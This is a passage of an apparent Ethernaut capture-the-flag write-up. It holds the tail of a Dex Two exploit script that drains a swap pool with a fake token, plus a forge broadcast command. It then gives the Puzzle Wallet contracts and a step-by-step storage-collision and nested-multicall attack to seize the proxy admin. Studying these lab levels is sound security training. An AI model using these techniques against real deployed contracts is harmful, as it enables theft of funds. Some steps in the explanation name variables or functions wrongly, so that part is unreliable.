</span><span>        dummyToken1</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">100</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">//transfering 100 tokens to the Dex contract</span><span>
</span>
<span>        dummyToken1</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">1000</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>dummyToken1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> token2</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">100</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">&quot;token2 balance after swap  is &quot;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>            instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>token2</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#6a9955">// dummyToken1.transfer(address(instance),100);//transfering 100 tokens to the Dex contract</span><span>
</span>
<span>        dummyToken1</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">1000</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>dummyToken1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> token1</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">200</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">&quot;token1 balance after swap  is &quot;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>            instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>token1</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Dummy</span><span> </span><span class="token" style="color:#569CD6">is</span><span> </span><span class="token" style="color:#dcdcaa">ERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;DummyToken&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Dummy&quot;</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_mint</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">10000</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level23Solution.s.sol:Level23Sol --rpc-url $RPC_URL --broadcast

</code></pre>
<h2>Puzzle Wallet</h2>
<p><strong>Level24.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> experimental ABIEncoderV2</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;./helpers/UpgradeableProxy-08.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">PuzzleProxy</span><span> </span><span class="token" style="color:#569CD6">is</span><span> UpgradeableProxy </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> pendingAdmin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> admin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _admin</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> _implementation</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> _initData</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#dcdcaa">UpgradeableProxy</span><span class="token" style="color:#d4d4d4">(</span><span>_implementation</span><span class="token" style="color:#d4d4d4">,</span><span> _initData</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        admin </span><span class="token" style="color:#d4d4d4">=</span><span> _admin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">modifier</span><span> onlyAdmin </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">==</span><span> admin</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Caller is not the admin&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">proposeNewAdmin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _newAdmin</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        pendingAdmin </span><span class="token" style="color:#d4d4d4">=</span><span> _newAdmin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">approveNewAdmin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _expectedAdmin</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> onlyAdmin </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>pendingAdmin </span><span class="token" style="color:#d4d4d4">==</span><span> _expectedAdmin</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Expected new admin by the current admin is not the pending admin&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        admin </span><span class="token" style="color:#d4d4d4">=</span><span> pendingAdmin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">upgradeTo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _newImplementation</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> onlyAdmin </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">_upgradeTo</span><span class="token" style="color:#d4d4d4">(</span><span>_newImplementation</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">PuzzleWallet</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint256</span><span> </span><span class="token" style="color:#569CD6">public</span><span> maxBalance</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">mapping</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#d4d4d4">=&gt;</span><span> </span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> whitelisted</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">mapping</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#d4d4d4">=&gt;</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> balances</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">init</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span> _maxBalance</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>maxBalance </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Already initialized&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        maxBalance </span><span class="token" style="color:#d4d4d4">=</span><span> _maxBalance</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">modifier</span><span> onlyWhitelisted </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>whitelisted</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Not whitelisted&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setMaxBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span> _maxBalance</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> onlyWhitelisted </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>balance </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Contract balance is not 0&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      maxBalance </span><span class="token" style="color:#d4d4d4">=</span><span> _maxBalance</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">addToWhitelist</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> addr</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">==</span><span> owner</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Not the owner&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        whitelisted</span><span class="token" style="color:#d4d4d4">[</span><span>addr</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">deposit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> onlyWhitelisted </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>balance </span><span class="token" style="color:#d4d4d4">&lt;=</span><span> maxBalance</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Max balance reached&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">+=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>value</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">execute</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> value</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">calldata</span><span> data</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> onlyWhitelisted </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> value</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Insufficient balance&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">-=</span><span> value</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span> success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> to</span><span class="token" style="color:#d4d4d4">.</span><span>call</span><span class="token" style="color:#d4d4d4">{</span><span> value</span><span class="token" style="color:#d4d4d4">:</span><span> value </span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">(</span><span>data</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Execution failed&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">multicall</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#569CD6">calldata</span><span> data</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> onlyWhitelisted </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">bool</span><span> depositCalled </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">for</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span> i </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span> i </span><span class="token" style="color:#d4d4d4">&lt;</span><span> data</span><span class="token" style="color:#d4d4d4">.</span><span>length</span><span class="token" style="color:#d4d4d4">;</span><span> i</span><span class="token" style="color:#d4d4d4">++</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">bytes</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> _data </span><span class="token" style="color:#d4d4d4">=</span><span> data</span><span class="token" style="color:#d4d4d4">[</span><span>i</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">bytes4</span><span> selector</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">assembly</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>                selector </span><span class="token" style="color:#d4d4d4">:=</span><span> </span><span class="token" style="color:#dcdcaa">mload</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">add</span><span class="token" style="color:#d4d4d4">(</span><span>_data</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">32</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>selector </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">.</span><span>deposit</span><span class="token" style="color:#d4d4d4">.</span><span>selector</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>                </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">!</span><span>depositCalled</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Deposit can only be called once&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>                </span><span class="token" style="color:#6a9955">// Protect against reusing msg.value</span><span>
</span><span>                depositCalled </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>            </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span> success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">delegatecall</span><span class="token" style="color:#d4d4d4">(</span><span>data</span><span class="token" style="color:#d4d4d4">[</span><span>i</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Error while delegating call&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>You’ll need to hijack this wallet to become the admin of the proxy.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li><code>PuzzleProxy</code> is a proxy contract and <code>PuzzleWallet</code> is an implementation contract.</li>
<li>Calls to <code>PuzzleProxy</code> will be forwarded to the <code>PuzzleWallet</code> through <code>delegatecall</code>.</li>
<li>Here, the storage layout of the two contracts are not matched. It may lead to storage collisions.</li>
<li>We need to become the admin of the proxy contract.</li>
<li>We can propose a new admin which will update the <code>pendingAdmin</code> variable in PuzzleProxy as well as the <code>owner</code> inside PuzzleWallet. Because of storage collision.</li>
<li>Then call the <code>addToWhiteList()</code> with our Attacker address to be able to call other functions of PuzzleWallet.</li>
<li>To override the <code>admin</code> variable in PuzzleProxy contract we have to change the <code>maxPrice</code> variable to address of our Attacker.</li>
<li>To update <code>maxPrice</code> we need to drain all the funds of the the PuzzleWallet. Initially it has 0.001 ether, We can able to deposit some ether and withdraw the same amount of ether only using the <code>execute()</code> function.</li>
<li>If we somehow able to pass this <code>require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</code> check we can withdraw more ether from wallet.</li>
<li>To do so, we need to send 0.001 ether only to the wallet, but we need to update the <code>balance[msg.sender]</code> to double of it. So that we can withdraw() 0.002 ether from the wallet. So that wallet balance will be zero.</li>
<li>We can use the <code>multicall()</code> function to do this, we call the <code>multicall()</code> with 0.001 ether and pass the function signature of the <code>deposit()</code> so that our balance will become 0.001 ether and balance of wallet will be 0.002 ether.</li>
<li>We cant call <code>deposit()</code> twice in a single call by passing calldata as [signature of <code>deposit</code> + signature of <code>deposit</code>]. As there is a check to catch this case.</li>
<li>But we can send the singature of the <code>deposit()</code> and a call to <code>multicall()</code> again with the <code>deposit()</code> signature.</li>
<li>That is we are calling multicall with a <code>deposit()</code> calldata along with multicall calldata with <code>deposit()</code> signature. i.e, a nested multicall.</li>
<li>This will modify the <code>balance[msg.sender]</code> twice so that it will become 0.00 ether, but the actual wallet balance is 0.002.</li>
<li>Now we have enough <code>balance[msg.sender]</code> to pass the check done in <code>execute()</code> function.</li>
<li>So, now we can withdraw 0.002 ether from wallet, therefore the wallet balance becomes <code>zero</code>.</li>
</ol>
<p><strong>Level24Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
